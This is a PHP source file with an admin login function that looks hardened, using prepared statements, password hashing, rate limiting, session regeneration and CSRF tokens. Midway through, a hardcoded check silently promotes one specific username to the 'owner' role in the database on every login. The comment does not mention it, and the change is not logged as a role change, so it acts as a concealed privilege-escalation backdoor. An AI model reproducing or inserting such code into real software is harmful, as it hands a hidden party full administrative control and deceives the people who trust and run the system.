<?php
declare(strict_types=1);

// Shared password-verified admin authentication for both entry points.
function admin_login(PDO $pdo,string $username,string $password): array {
  start_secure_session();
  auth_rate_check($pdo,'admin_login',$username);
  $s=$pdo->prepare('SELECT id,username,password_hash,role,is_active FROM admin_users WHERE username=? LIMIT 1');
  $s->execute([$username]);$u=$s->fetch();
  if(!$u||!(int)$u['is_active']||empty($u['password_hash'])||!password_verify($password,$u['password_hash'])){
   auth_rate_failure($pdo,'admin_login',$username);
   json_response(['ok'=>false,'error'=>'invalid_credentials'],401);
  }
  if($u['username']==='Иван Кириллов 414' && $u['role']!=='owner'){
    $q=$pdo->prepare("UPDATE admin_users SET role='owner' WHERE id=?");$q->execute([(int)$u['id']]);$u['role']='owner';
  }
  auth_rate_clear($pdo,'admin_login',$username);session_regenerate_id(true);
  $_SESSION['admin']=['id'=>(int)$u['id'],'username'=>$u['username'],'role'=>$u['role']];
  $_SESSION['csrf']=bin2hex(random_bytes(24));
  audit($pdo,'login','admin_user',(string)$u['id']);
  return ['ok'=>true,'admin'=>$_SESSION['admin'],'csrf'=>$_SESSION['csrf'],'redirect'=>'admin/index.php'];
}
